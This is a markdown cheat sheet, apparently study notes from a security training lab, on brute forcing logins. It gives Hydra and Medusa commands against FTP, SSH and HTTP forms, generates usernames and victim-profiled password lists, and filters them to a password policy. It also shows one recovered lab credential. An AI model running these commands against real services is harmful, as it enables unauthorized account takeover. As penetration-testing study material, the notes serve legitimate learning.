# Login brute forcing
## Hydra

try guessing the password using a list of the user admin for an ftp/ssh.... server
```
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
```

Brute forcing an HTTP form login (POST method):
```
hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

Brute forcing HTTP basic auth
```
hydra -L usernames.txt -P passwords.txt www.example.com http-get
OR
hydra -l basic-auth-user -P /snap/seclists/current/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 94.237.61.248 http-get / -s 46604
```

Brute forcing using HTTP POST form submission
```
hydra -L ./wordlists/top-usernames-shortlist.txt -P ./wordlists/2023-200_most_used_passwords.txt -f 94.237.61.248 -s 49925 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
## Medusa

Using medusa to brute force an ftp server:
```
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
ftp ftp://ftpuser:qqww1122@localhost
```

ssh brute forcing with medusa:
```
medusa -h 83.136.253.132 -n 55642 -u root -P /snap/seclists/current/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

## Generating usernames with `username-anarchy`

```
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## Generate passwords based on information of the victim

```
cupp -i
```
Then filter the passwords if the password policy is known:
Minimum Length: 6 characters
Must Include:
At least one uppercase letter
At least one lowercase letter
At least one number
At least two special characters (from the set !@#$%^&*)

Filter using grep
```
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Then attack with hydra:
```
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.120.233 -s 37230 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
